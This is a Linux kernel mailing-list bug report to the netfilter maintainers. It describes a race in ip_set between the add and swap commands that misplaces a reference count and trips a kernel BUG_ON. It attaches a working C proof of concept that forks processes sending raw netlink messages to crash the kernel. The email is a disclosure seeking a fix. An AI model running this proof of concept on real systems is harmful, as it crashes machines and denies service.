Return-Path: <netfilter-devel-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id C2E10C83F33
	for <netfilter-devel@archiver.kernel.org>; Mon,  4 Sep 2023 23:38:41 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S240280AbjIDXim (ORCPT
        <rfc822;netfilter-devel@archiver.kernel.org>);
        Mon, 4 Sep 2023 19:38:42 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56426 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S233221AbjIDXim (ORCPT
        <rfc822;netfilter-devel@vger.kernel.org>);
        Mon, 4 Sep 2023 19:38:42 -0400
Received: from mail-pl1-x634.google.com (mail-pl1-x634.google.com [IPv6:2607:f8b0:4864:20::634])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id BD8651B4
        for <netfilter-devel@vger.kernel.org>; Mon,  4 Sep 2023 16:38:38 -0700 (PDT)
Received: by mail-pl1-x634.google.com with SMTP id d9443c01a7336-1bdbf10333bso14498465ad.1
        for <netfilter-devel@vger.kernel.org>; Mon, 04 Sep 2023 16:38:38 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20221208; t=1693870718; x=1694475518; darn=vger.kernel.org;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :from:to:cc:subject:date:message-id:reply-to;
        bh=9D6jnPUqSoYCPVevFEI3g2975mHWxOEggMAgZNgztSw=;
        b=C8rJ6/QmbhEIlFA6TnjZtpxP2sgJY1w7jgqkwFiKMBSDyCDErtETu4zwL3Om2OCAX/
         Zrx8i6gtqWsL5ZaNidq3f3uCQ6f/VZugeZB9KxR1rOv2UOL/dpRJa2onXMZorbvIYDgj
         pU5W8zmz53zdenMJgYJ++RlVhHBSSTlaz1D4oMoKWtVHQiKilfvEKg41jQsjz3IblUGX
         9n3RmPf2v5T2Y6dDPyMT/yyhy6RZf8kYFktdE5v9x+fMx0yX+pv4KvkN3lU7n36c2bqn
         LHzDp/u/7RamZHQJ5h5Pnql1UIG75VfWUowtwkZMlSRtRxiS1IzExt1YJjXGUQbP5eGg
         bTZQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20221208; t=1693870718; x=1694475518;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=9D6jnPUqSoYCPVevFEI3g2975mHWxOEggMAgZNgztSw=;
        b=GRAJ19EUZYw1V1Ta9Wg6oyA1S80aTHVOqP7e6HYGgyy89xqqPxSNAcB2ofwaKxAFJg
         WQtbwCzCe5W6fvX7RgxOwoV2OyQopkhQCqDC86jHRtcMuuyuDKiC9y5jg03d5V0ahbOq
         5QQq5cvliRi5tJGKNFG6ApDqUg3/dDjEwhZlT/tBHi5hayOtuIN14kqfAzVMMl/B6jFn
         EoUMgN5sNZ2TPA3bz1O2GVX5JO8yNfEsIqTqrG3TgSiUZT6tCkCJ2/j0srqQ609V3t8R
         eF+ohiW6XMcj66neNytziDjmnCreiGjUyQVmXyRzqa7fMYssatbPDeuAczWhIlxVorA2
         jEsQ==
X-Gm-Message-State: AOJu0YxxwgCJynjxU1y2EHC+Tqyy8dcj03x2NErexm7qICXkE1z+4GuT
        f8mE2iVzmrTcXP4ZbDi568VS0iyoyCqUDBlbIU0=
X-Google-Smtp-Source: AGHT+IHs/4oBo8cdYQozMsDLE6/akw+v1ib5TedfSONvQLZ2TN1iqZsaM7pnO8ngq9sG3xXEwo2MoA==
X-Received: by 2002:a17:903:26ce:b0:1b8:4f93:b210 with SMTP id jg14-20020a17090326ce00b001b84f93b210mr10952328plb.45.1693870717770;
        Mon, 04 Sep 2023 16:38:37 -0700 (PDT)
Received: from westworld (209-147-138-147.nat.asu.edu. [209.147.138.147])
        by smtp.gmail.com with ESMTPSA id 13-20020a170902c24d00b001bb1f0605b2sm8014741plg.214.2023.09.04.16.38.36
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 04 Sep 2023 16:38:37 -0700 (PDT)
Date:   Mon, 4 Sep 2023 16:38:34 -0700
From:   Kyle Zeng <zengyhkyle@gmail.com>
To:     netfilter-devel@vger.kernel.org, davem@davemloft.net,
        pablo@netfilter.org, kadlec@netfilter.org, edumazet@google.com
Subject: Race between IPSET_CMD_CREATE and IPSET_CMD_SWAP
Message-ID: <ZPZqetxOmH+w/myc@westworld>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="WxjOptb85JCDmtnW"
Content-Disposition: inline
Precedence: bulk
List-ID: <netfilter-devel.vger.kernel.org>
X-Mailing-List: netfilter-devel@vger.kernel.org


--WxjOptb85JCDmtnW
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

There is a race between IPSET_CMD_ADD and IPSET_CMD_SWAP in netfilter/ip_set, which can lead to the invocation of `__ip_set_put` on a wrong `set`, triggering the `BUG_ON(set->ref == 0);` check in it.

More specifically, in `ip_set_swap`, it will hold the `ip_set_ref_lock`
and then do the following to swap the sets:
~~~
	strncpy(from_name, from->name, IPSET_MAXNAMELEN);
	strncpy(from->name, to->name, IPSET_MAXNAMELEN);
	strncpy(to->name, from_name, IPSET_MAXNAMELEN);

	swap(from->ref, to->ref);
~~~
But in the retry loop in `call_ad`:
~~~
		if (retried) {
			__ip_set_get(set);
			nfnl_unlock(NFNL_SUBSYS_IPSET);
			cond_resched();
			nfnl_lock(NFNL_SUBSYS_IPSET);
			__ip_set_put(set);
		}
~~~
No lock is hold, when it does the `cond_resched()`.
As a result, `ip_set_ref_lock` (in thread 2) can swap the set with another when thread
1 is doing the `cond_resched()`. When it wakes up, the `set` variable
alreays means another `set`, calling `__ip_set_put` on it will decrease
the refcount on the wrong `set`, triggering the `BUG_ON` call.

I'm not sure what is the proper way to fix this issue so I'm asking for
help.

A proof-of-concept code that can trigger the bug is attached.

The bug is confirmed on v5.10, v6.1, v6.5.rc7 and upstream.

Best,
Kyle

--WxjOptb85JCDmtnW
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <assert.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter/nfnetlink.h>

#include <stdint.h>

int nl_sock;

void *build_pkt(struct nlmsghdr *hdr, struct nfgenmsg *nfgenmsg, void *attrs, int attr_len)
{
    void *payload = calloc(1, 0x1000);
    void *ptr = payload;
    hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg) + attr_len;
	//printf("%#x %#x %#x\n", sizeof(struct nlmsghdr), sizeof(struct nfgenmsg), attr_len);
    //printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
    //printf("attr_len: %#x\n", attr_len);

    memcpy(ptr, hdr, sizeof(struct nlmsghdr));
    ptr += sizeof(struct nlmsghdr);
    memcpy(ptr, nfgenmsg, sizeof(struct nfgenmsg));
    ptr += sizeof(struct nfgenmsg);
    memcpy(ptr, attrs, attr_len);
    return payload;
}

void func1()
{
	struct nlmsghdr nlmsghdr = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x609, // IPSET_CMD_ADD(9)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs[] =	"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"	// IPSET_ATTR_SETNAME
					"\x54\x00""\x07\x80"						// IPSET_ATTR_DATA
						"\x06\x00""\x04\x40""\x00\x00\x00\x00"	// IPSET_ATTR_PORT_FROM
						"\x06\x00""\x05\x40""\x4e\x00\x00\x00"	// IPSET_ATTR_PORT_TO
						"\x05\x00""\x07\x00""\x11\x00\x00\x00"	// IPSET_ATTR_PROTO => IPPROTO_UDP, just a protocol that has ports (ip_set_proto_with_ports)
						"\x08\x00""\x08\x40""\x00\x00\x00\x00"
						"\x18\x00""\x14\x80"
							"\x14\x00""\x02\x40""\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa"
						"\x18\x00""\x01\x80"
							"\x14\x00""\x02\x40""\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\xff\xff\x7f\x00\x00\x01";
	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
}

void func2()
{
	struct nlmsghdr nlmsghdr = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x606, // IPSET_CMD_SWAP(6)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs[] =	"\x09\x00""\x03\x00""set1\x00\x00\x00\x00"
					"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00";

	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
}

void context_setup()
{
	nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

	struct nlmsghdr nlmsghdr1 = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg1 = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs1[] =	"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"
					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
					"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
					"\x05\x00""\x01\x00""\x07\x00\x00\x00";

	void *payload1 = build_pkt(&nlmsghdr1, &nfgenmsg1, attrs1, sizeof(attrs1)-1);
	send(nl_sock, payload1, nlmsghdr1.nlmsg_len, 0);

	struct nlmsghdr nlmsghdr2 = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg2 = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs2[] =	"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
					"\x09\x00""\x02\x00""set1\x00\x00\x00\x00"
					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
					"\x05\x00""\x01\x00""\x07\x00\x00\x00";

	void *payload2 = build_pkt(&nlmsghdr2, &nfgenmsg2, attrs2, sizeof(attrs2)-1);
	send(nl_sock, payload2, nlmsghdr2.nlmsg_len, 0);
}

int main(void)
{
	context_setup();
	if(!fork()) func1();
	if(!fork()) func2();
	getchar();
	return 0;
}

--WxjOptb85JCDmtnW--
